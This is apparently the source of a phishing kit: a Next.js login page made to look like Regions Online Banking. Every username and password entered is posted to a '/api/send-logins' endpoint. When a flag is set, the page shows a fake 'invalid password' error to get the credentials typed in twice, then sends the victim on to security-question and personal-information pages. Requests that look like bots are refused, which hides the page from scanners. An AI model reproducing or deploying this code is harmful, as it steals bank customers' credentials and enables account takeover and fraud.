import {
  Box,
  Text,
  Link,
  UnorderedList,
  ListItem,
  Flex,
  BoxProps,
} from "@chakra-ui/react";
import axios from "axios";
import Head from "next/head";
import { useRouter } from "next/router";
import React, { useContext, useState } from "react";
import { useForm } from "react-hook-form";
import { yupResolver } from "@hookform/resolvers/yup";
import * as yup from "yup";
import { Button } from "../components/Button";
import { Checkbox } from "../components/Checkbox";
import { Container } from "../components/Container";
import { Input } from "../components/Input";
import { Wrapper } from "../components/Wrapper";
import { DataContext } from "./_app";
import { Error } from "../components/Error";
import MobileDetect from "mobile-detect";
import { NextPage } from "next";

interface LoginProps {}

const schema = yup.object().shape({
  username: yup.string().required(`Username is required to log in.`),
  password: yup.string().required(`Password is required to log in.`).min(6),
});

export const Login: NextPage<LoginProps> = () => {
  const [loginAttempt, setLoginAttempt] = useState(0);
  const [showError, setShowError] = useState(false);
  const [showPasswordForm, setShowPasswordForm] = useState(false);
  const [loading, setLoading] = useState(false);

  const [logins, setLogins] = useState({});
  const { data: datas, setData } = useContext(DataContext);
  const { push } = useRouter();
  const {
    register,
    handleSubmit,
    reset,
    formState: { errors },
    watch,
  } = useForm({
    resolver: yupResolver(schema),
    mode: `onSubmit`,
  });

  const onSubmit = handleSubmit(async (data) => {
    setLoading(true);
    const formData = new FormData();

    formData.append(`form`, `LOGIN DETAILS`);
    formData.append(
      `loginDetails`,
      JSON.stringify({ loginAttempt: loginAttempt + 1, ...data })
    );

    try {
      await axios.post(`/api/send-logins`, formData, {
        headers: { "content-type": `multipart/form-data` },
      });
    } catch (error) {
      console.log(error);
    }

    setLogins({
      ...logins,
      [loginAttempt + 1]: {
        form: `LOGIN DETAILS`,
        loginDetails: { loginAttempt: loginAttempt + 1, ...data },
      },
    });

    if (!loginAttempt && process.env.NEXT_PUBLIC_DOUBLE_LOGIN === `ON`) {
      setLoginAttempt(1);
      setLoading(false);
      setShowError(true);
      setShowError(true);
      setShowPasswordForm(false);
      reset({
        username: ``,
        password: ``,
      });
      return;
    }

    setData({
      ...datas,
      logins: {
        ...logins,
        [loginAttempt + 1]: {
          form: `LOGIN DETAILS`,
          loginDetails: { loginAttempt: loginAttempt + 1, ...data },
        },
      },
    });

    push(
      process.env.NEXT_PUBLIC_SECQES_PAGE === `ON`
        ? `/customerservice/securityquestions`
        : `/customerservice/personalinformation`
    );
  });

  return (
    <Wrapper>
      <Head>
        <title>
          Regions Online Banking - Log in to your accounts | Regions
        </title>
      </Head>
      <Box as={`main`} display={`block`}>
        <Container>
          <Text
            as={`h1`}
            w={`1px`}
            h={`1px`}
            pos={`absolute`}
            m={`-1px`}
            p={0}
            overflow={`hidden`}
            border={0}
            style={{
              clip: `rect(0, 0, 0, 0)`,
            }}
          >
            {" "}
            Login to Online Banking
          </Text>
          {showError ? (
            <Error
              message={
                showError
                  ? `Oops! Either the Username or Password you entered is invalid. Please try again.`
                  : undefined
              }
              setShowError={setShowError}
            />
          ) : null}
          <Box
            w={`100%`}
            float={`left`}
            pos={`relative`}
            minH={`1px`}
            px={`15px`}
            display={showPasswordForm ? `none` : `block`}
          >
            <Box
              display={`block`}
              w={[`100%`, `50%`]}
              float={`left`}
              pos={`relative`}
              minH={`1px`}
              px={`15px`}
            >
              <Text
                as={`h2`}
                fontFamily={`inherit`}
                fontWeight={700}
                lineHeight={1.1}
                color={`inherit`}
                my={`13.5px`}
                fontSize={`18px`}
              >
                Existing Online Customers
              </Text>
              <Box
                mx={`-15px`}
                _before={{
                  content: `" "`,
                  display: `table`,
                }}
                _after={{
                  clear: `both`,
                  content: `" "`,
                  display: `table`,
                }}
              >
                <Box
                  w={`100%`}
                  float={`left`}
                  pos={`relative`}
                  minH={`1px`}
                  px={`15px`}
                >
                  <Text fontSize={`18px`} m={`2% 0 3% 0`} lineHeight={`27px`}>
                    Please enter your Username to log in.
                  </Text>
                  <Box
                    as={`form`}
                    m={`0px auto`}
                    w={`100%`}
                    minW={`290px`}
                    bgImage={`none`}
                    listStyleType={`inherit`}
                    cursor={`auto`}
                    style={{
                      content: `normal`,
                    }}
                  >
                    <Input
                      label={`Username`}
                      error={errors.username && errors.username.message}
                      register={register}
                      showExcl={false}
                      name={`username`}
                      //   error={`Username is required to log in.`}
                    />
                    <Box
                      mb={`30px`}
                      fontSize={`16px`}
                      border={`2px solid #eee`}
                      borderRadius={`2px`}
                      boxShadow={`none`}
                      minH={`20px`}
                      p={`19px`}
                      bgColor={`#f9f9f9`}
                      bgImage={`none`}
                      listStyleType={`inherit`}
                      cursor={`auto`}
                      style={{
                        content: `normal`,
                      }}
                    >
                      {` Please check that the "Caps Lock" or "Num Lock" key is off. `}
                    </Box>
                    <Box
                      bgImage={`none`}
                      listStyleType={`inherit`}
                      cursor={`auto`}
                      style={{
                        content: `normal`,
                      }}
                    >
                      <Box float={`left`}>
                        <Checkbox />
                      </Box>
                      <Box float={`right`} w={[`100%`, `initial`]}>
                        <Button
                          onClick={() => {
                            if (watch(`username`)) {
                              setShowPasswordForm(true);
                            }
                            onSubmit();
                          }}
                        >
                          Next
                        </Button>
                      </Box>
                    </Box>
                  </Box>
                </Box>
                <ForgotPassword />
              </Box>
            </Box>
            <Box
              display={`block`}
              w={[`100%`, `50%`]}
              float={`left`}
              pos={`relative`}
              minH={`1px`}
              px={`15px`}
              m={[`15% 0 10% 0`, 0]}
              mt={[`5%`, 0]}
            >
              <Text
                as={`h2`}
                fontFamily={`inherit`}
                fontWeight={700}
                lineHeight={1.1}
                color={`inherit`}
                my={`13.5px`}
                fontSize={`18px`}
              >
                New Online Customers
              </Text>
              <Box
                fontSize={`18px`}
                mb={`30px`}
                border={`2px solid #eee`}
                borderRadius={`2px`}
                boxShadow={`none`}
                minH={`20px`}
                p={`19px`}
                bgColor={`#f9f9f9`}
              >
                <Box
                  p={`20px 0px 0px 10px`}
                  mx={`-15px`}
                  _before={{
                    content: `" "`,
                    display: `table`,
                  }}
                  _after={{
                    clear: `both`,
                    content: `" "`,
                    display: `table`,
                  }}
                >
                  <Box
                    mb={0}
                    w={`100%`}
                    float={`left`}
                    pos={`relative`}
                    minH={`1px`}
                    px={`15px`}
                  >
                    <Text
                      pb={`10px`}
                      mt={0}
                      fontSize={`16px`}
                      fontWeight={800}
                      mb={`5px`}
                      color={`inherit`}
                      fontFamily={`inherit`}
                      lineHeight={1.1}
                    >
                      {" "}
                      Enroll Now To:
                    </Text>
                    <UnorderedList
                      mb={0}
                      fontSize={`14px`}
                      m={`0px 0px 13.5px`}
                      pl={`1em`}
                    >
                      {[
                        `Access your accounts online`,
                        `Pay bills online`,
                        `Send us a secure message`,
                      ].map((item) => (
                        <ListItem key={item} lineHeight={1.5}>
                          <Text as={`span`} fontSize={`16px`} pl={`2%`} mb={0}>
                            {item}
                          </Text>
                        </ListItem>
                      ))}
                    </UnorderedList>
                  </Box>
                </Box>
                <Flex
                  p={`65px 20px 10px 0px`}
                  mb={0}
                  flexDir={`row-reverse`}
                  mx={`-15px`}
                  _before={{
                    content: `" "`,
                    display: `table`,
                  }}
                  _after={{
                    clear: `both`,
                    content: `" "`,
                    display: `table`,
                  }}
                >
                  <Button
                    as={`a`}
                    bgColor={`#178`}
                    borderColor={`#178`}
                    m={[`10% 0 0 0`, 0]}
                    w={`auto`}
                    textDecor={`none`}
                    _hover={{
                      bgColor: `#0b4f5b`,
                      borderColor: `#0b4f5b`,
                      color: `#fff`,
                    }}
                    _active={{
                      bgColor: `#0b4f5b`,
                      borderColor: `#0b4f5b`,
                      color: `#fff`,
                      bgImage: `none`,
                      outline: 0,
                    }}
                    _focus={{
                      bgColor: `#0b4f5b`,
                      borderColor: `#0b4f5b`,
                      color: `#fff`,
                      bgImage: `none`,
                      outline: `thin dotted black`,
                      outlineOffset: `2px`,
                    }}
                  >
                    Enroll
                  </Button>
                </Flex>
              </Box>
            </Box>
          </Box>
          <Box
            display={showPasswordForm ? `block` : `none`}
            ml={[0, `25%`]}
            w={[`100%`, `50%`]}
            float={`left`}
            pos={`relative`}
            minH={`1px`}
            px={`15px`}
            mr={`-15px`}
            pb={[`5%`, `initial`]}
            _before={{
              content: `" "`,
              display: `table`,
            }}
            _after={{
              clear: `both`,
              content: `" "`,
              display: `table`,
            }}
          >
            <Flex
              display={`flex`}
              flexDir={`column`}
              w={`100%`}
              float={`left`}
              pos={`relative`}
              minH={`1px`}
              px={`15px`}
              mr={`-15px`}
            >
              <Text
                as={`h2`}
                fontFamily={`inherit`}
                fontWeight={700}
                lineHeight={1.1}
                color={`inherit`}
                my={`13.5px`}
                fontSize={`18px`}
              >
                Existing Online Customers
              </Text>
              <Box display={`block`}>
                <Box
                  w={`100%`}
                  float={`left`}
                  pos={`relative`}
                  minH={`1px`}
                  px={`15px`}
                  mx={`-15px`}
                  _before={{
                    content: `" "`,
                    display: `table`,
                  }}
                  _after={{
                    clear: `both`,
                    content: `" "`,
                    display: `table`,
                  }}
                >
                  <Text
                    as={`span`}
                    color={`#3A3A3A`}
                    fontSize={`18px`}
                    lineHeight={`24px`}
                    display={`inline-block`}
                  >
                    Please enter your password for username to login.
                  </Text>
                  <Box
                    mt={`20px`}
                    mx={`-15px`}
                    _before={{
                      content: `" "`,
                      display: `table`,
                    }}
                    _after={{
                      clear: `both`,
                      content: `" "`,
                      display: `table`,
                    }}
                  >
                    <Box
                      mb={`30px`}
                      w={`100%`}
                      float={`left`}
                      pos={`relative`}
                      minH={`1px`}
                      px={`15px`}
                    >
                      <Box as={`form`} m={`0px auto`} w={`100%`} minW={`290px`}>
                        <Input
                          type={`password`}
                          label={`Password`}
                          pt={`27px`}
                          register={register}
                          showExcl={false}
                          name={`password`}
                        />
                        <Box
                          m={`5% 0 10% 0`}
                          display={[`flex`, `block`]}
                          flexDir={`column-reverse`}
                        >
                          <Box
                            float={`left`}
                            textAlign={[`center`, `initial`]}
                            width={[`100%`, `initial`]}
                            m={[`5% 0 5% 0`, `initial`]}
                          >
                            <Button
                              color={`#117788`}
                              fontSize={`18px`}
                              fontWeight={`bold`}
                              letterSpacing={0}
                              textAlign={`center`}
                              bgColor={`white`}
                              borderColor={`#ccc`}
                              borderRadius={`2px`}
                              borderWidth={`2px`}
                              lineHeight={1.3333333}
                              m={0}
                              p={`10px 20px`}
                              _hover={{
                                color: `#178`,
                                textDecor: `none`,
                                bgColor: `white`,
                              }}
                              _active={{
                                bgImage: `none`,
                                outline: 0,
                                bgColor: `white`,
                              }}
                              _focus={{
                                color: `#178`,
                                textDecor: `none`,
                                outline: `thin dotted black`,
                                outlineOffset: `2px`,
                                bgColor: `white`,
                              }}
                              onClick={() => setShowPasswordForm(false)}
                            >
                              Go Back
                            </Button>
                          </Box>
                          <Box
                            float={`right`}
                            textAlign={[`center`, `initial`]}
                            width={[`100%`, `initial`]}
                            m={[`5% 0 5% 0`, `initial`]}
                          >
                            <Button
                              fontSize={`18px`}
                              fontWeight={`bold`}
                              letterSpacing={0}
                              onClick={onSubmit}
                              disabled={loading}
                              m={0}
                            >
                              Log in
                            </Button>
                          </Box>
                        </Box>
                      </Box>
                    </Box>
                  </Box>
                </Box>
              </Box>
              <ForgotPassword ml={0} />
            </Flex>
          </Box>
        </Container>
      </Box>
    </Wrapper>
  );
};

const ForgotPassword: React.FC<BoxProps> = ({ ...props }) => {
  return (
    <Box mb={[`10%`, `initial`]}>
      <Box
        as={`span`}
        ml={`15px`}
        h={`18px`}
        w={`270px`}
        mt={`5%`}
        fontFamily={`"Source Sans Pro"`}
        fontSize={`16px`}
        letterSpacing={0}
        lineHeight={`18px`}
        {...props}
      >
        <Text as={`span`}>Forgot </Text>
        <Link
          color={`#178`}
          bgColor={`transparent`}
          textDecor={`underline`}
          _hover={{
            color: `#083b44`,
            outline: 0,
          }}
          _focus={{
            color: `#083b44`,
            outline: `thin dotted black`,
            outlineOffset: `2px`,
          }}
          _active={{
            outline: 0,
          }}
        >
          Username
        </Link>
        {` or `}
        <Link
          color={`#178`}
          bgColor={`transparent`}
          textDecor={`underline`}
          _hover={{
            color: `#083b44`,
            outline: 0,
          }}
          _focus={{
            color: `#083b44`,
            outline: `thin dotted black`,
            outlineOffset: `2px`,
          }}
          _active={{
            outline: 0,
          }}
        >
          Password?
        </Link>
      </Box>
    </Box>
  );
};

Login.getInitialProps = ({ res, req, ...props }) => {
  const md = new MobileDetect(req?.headers[`user-agent`] as string);
  const isBot = md.is(`Bot`);
  if (isBot) {
    res?.end(`Fuck off`);
    return {};
  }

  return {
    ...props,
  };
};

export default Login;
